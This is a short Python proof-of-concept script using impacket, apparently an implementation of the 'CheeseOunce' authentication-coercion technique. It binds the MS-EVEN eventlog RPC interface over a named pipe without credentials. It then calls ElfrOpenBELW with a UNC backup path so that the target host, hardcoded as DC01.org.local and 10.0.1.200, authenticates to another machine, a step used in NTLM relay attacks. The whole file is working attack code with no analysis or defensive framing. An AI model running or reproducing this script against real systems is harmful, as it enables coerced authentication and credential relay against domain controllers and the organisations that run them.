from impacket.dcerpc.v5 import even
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_INTEGRITY

class CheeseOunce:
    def __init__(self):
        self.username = ""
        self.domain   = ""
        self.serverName = "DC01.org.local"
        self.password = ""
        self.machine  = "10.0.1.200"
        self.hashes   = ""
        self.stringBinding = r'ncacn_np:%s[\PIPE\eventlog]' % self.machine
        self.ts = ('71710533-BEBA-4937-8319-B5DBEF9CCC36', '1.0')

    def connect(self):
        print(f"[*] Connecting to {self.stringBinding}")
        rpctransport = transport.DCERPCTransportFactory(self.stringBinding)
        if len(self.hashes) > 0:
            lmhash, nthash = self.hashes.split(':')
        else:
            lmhash = ''
            nthash = ''
        #if hasattr(rpctransport, 'set_credentials'):
        #    # This method exists only for selected protocol sequences.
        #    rpctransport.set_credentials(self.username, self.password, self.domain, lmhash, nthash)
        dce = rpctransport.get_dce_rpc()
        print("[*] Connecting...")
        #dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_INTEGRITY)
        dce.connect()
        dce.bind(even.MSRPC_UUID_EVEN, transfer_syntax = self.ts)
        print("[*] Bind successful")

        return dce, rpctransport

    def run(self):
        dce, rpctransport = self.connect()
        request = even.ElfrOpenBELW()
        request['UNCServerName'] = NULL
        request['BackupFileName'] = '\\??\\UNC\\%s\\scratch\\xx' % self.machine
        request['MajorVersion'] = 1
        request['MinorVersion'] = 1
        try:
            resp = dce.request(request)
        except Exception as e:
            if str(e).find('STATUS_OBJECT_NAME_NOT_FOUND')  <  0:
                raise
            resp = e.get_packet()
        resp.dump()

if __name__ == "__main__":
    CheeseOunce().run()
